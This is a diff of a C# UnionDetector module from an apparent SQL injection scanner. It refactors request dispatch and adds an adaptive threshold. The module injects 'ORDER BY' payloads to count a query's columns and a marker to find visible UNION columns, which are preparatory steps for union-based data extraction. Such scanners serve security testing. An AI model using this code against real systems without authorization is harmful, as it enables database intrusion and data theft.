@@ -1,25 +1,27 @@
 ﻿using SQLiScanner.Models;
 using SQLiScanner.Models.Enums;
+using SQLiScanner.Services;
 using SQLiScanner.Utility;
 using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Net.Http;
+using System.Text;
 using System.Threading.Tasks;
 
 namespace SQLiScanner.Modules
 {
     public class UnionDetector
     {
-        private readonly HttpClient _client;
-        public UnionDetector(HttpClient client)
+        private readonly IRequestDispatcher _requestService;
+        public UnionDetector(IRequestDispatcher requestService)
         {
-            _client = client;
+            _requestService = requestService;
         }
 
         public async Task<int> GetColumnCountAsync(
             CrawlResult target, 
-            DetectionResult detectedData, 
+            AnalyzingResult detectedData, 
             PayloadState trackingState,
             CancellationToken cancellationToken = default)
         {
@@ -29,16 +31,20 @@ namespace SQLiScanner.Modules
                 ? bodyVal
                 : (System.Web.HttpUtility.ParseQueryString(target.RawQueryString)[detectedData.VulnerableParam] ?? "");
 
-            int baseLength = await GetResponseLengthAsync(target, detectedData.VulnerableParam, originalValue, cancellationToken);
+            int baseLength = await GetResponseLengthAsync(target, originalValue, detectedData.Route, cancellationToken);
 
             if (baseLength <= 0) return -1;
+
+            double columnErrorThreshold = target.PageTolerance * 4.0;
+            if (columnErrorThreshold < 0.15) columnErrorThreshold = 0.15;
+            if (columnErrorThreshold > 0.40) columnErrorThreshold = 0.40;
 
             for (int i = 1; i <= 50; i++)
             {
                 string payload = $"{originalValue}{detectedData.WorkingPrefix} ORDER BY {i}{detectedData.WorkingSuffix}";
-                int currentLength = await GetResponseLengthAsync(target, detectedData.VulnerableParam, payload, cancellationToken);
+                int currentLength = await GetResponseLengthAsync(target, payload, detectedData.Route, cancellationToken);
 
-                bool isError = Math.Abs(currentLength - baseLength) > baseLength * 0.2;
+                bool isError = Math.Abs(currentLength - baseLength) > baseLength * columnErrorThreshold;
 
                 if (isError)
                 {
@@ -56,7 +62,7 @@ namespace SQLiScanner.Modules
 
         public async Task<List<int>> GetVisibleColumnsAsync(
             CrawlResult target, 
-            DetectionResult detectedData, 
+            AnalyzingResult detectedData, 
             int colCount,
             PayloadState trackingState,
             CancellationToken cancellationToken = default)
@@ -84,7 +90,7 @@ namespace SQLiScanner.Modules
                 try
                 {
                     // Ở đây ta cần HTML string để tìm text '9901'
-                    string? html = await SendPayloadGetStringAsync(target, detectedData.VulnerableParam, payload, cancellationToken);
+                    string? html = await SendPayloadGetStringAsync(target, payload, detectedData.Route, cancellationToken);
 
                     if (!string.IsNullOrEmpty(html) && html.Contains(magicTag))
                     {
@@ -99,74 +105,24 @@ namespace SQLiScanner.Modules
 
         #region Các hàm phụ trợ
         private async Task<int> GetResponseLengthAsync(
-            CrawlResult target, string paramKey, string payloadValue, CancellationToken cancellationToken = default)
+            CrawlResult target, string payload, InjectionRoute route, CancellationToken cancellationToken = default)
         {
             try
             {
-                byte[]? bytes = await SendPayloadGetBytesAsync(target, paramKey, payloadValue, cancellationToken);
-                return bytes == null ? -1 : bytes.Length;
+                var response = await _requestService.RequestAsync(target, payload, route, cancellationToken);
+                return response.Bytes == null ? -1 : response.Bytes.Length;
             }
             catch { return -1; }
         }
 
-        private async Task<byte[]?> SendPayloadGetBytesAsync(
-            CrawlResult target, string injectKey, string injectValue, CancellationToken cancellationToken = default)
-        {
-            try
-            {
-                var method = new HttpMethod(target.HttpMethod.ToUpper());
-                HttpRequestMessage request;
-
-                var queryParams = System.Web.HttpUtility.ParseQueryString(target.RawQueryString);
-                var bodyParams = new Dictionary<string, string>(target.Params);
-
-                bool isQueryParam = target.RawQueryString.Contains($"{injectKey}=") || !target.Params.ContainsKey(injectKey);
-
-                if (isQueryParam)
-                {
-                    queryParams[injectKey] = injectValue;
-                    bodyParams.Remove(injectKey);
-                }
-                else
-                {
-                    bodyParams[injectKey] = injectValue; 
-                }
-
-                var uriBuilder = new UriBuilder(target.BaseUrl);
-                uriBuilder.Query = queryParams.ToString();
-
-                request = new HttpRequestMessage(method, uriBuilder.ToString());
-
-                if (method == HttpMethod.Post)
-                {
-                    request.Content = new FormUrlEncodedContent(bodyParams);
-                }
-
-
-                if (!request.Headers.Contains("User-Agent"))
-                {
-                    request.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
-                }
-
-                using var response = await _client.SendAsync(request, HttpCompletionOption.ResponseContentRead);
-
-                var bytes = await response.Content.ReadAsByteArrayAsync();
-
-                return bytes;
-            }
-            catch 
-            {
-                return null;
-            }
-        }
-
+      
         private async Task<string?> SendPayloadGetStringAsync(
-            CrawlResult target, string paramKey, string payloadValue, CancellationToken cancellationToken = default)
+            CrawlResult target, string payload, InjectionRoute route, CancellationToken cancellationToken = default)
         {
             try
             {
-                byte[]? bytes = await SendPayloadGetBytesAsync(target, paramKey, payloadValue, cancellationToken);
-                return bytes == null ? "" : System.Text.Encoding.UTF8.GetString(bytes);
+                var response = await _requestService.RequestAsync(target, payload, route, cancellationToken);
+                return response.Bytes == null ? "" : System.Text.Encoding.UTF8.GetString(response.Bytes);
             }
             catch { return ""; }
         }
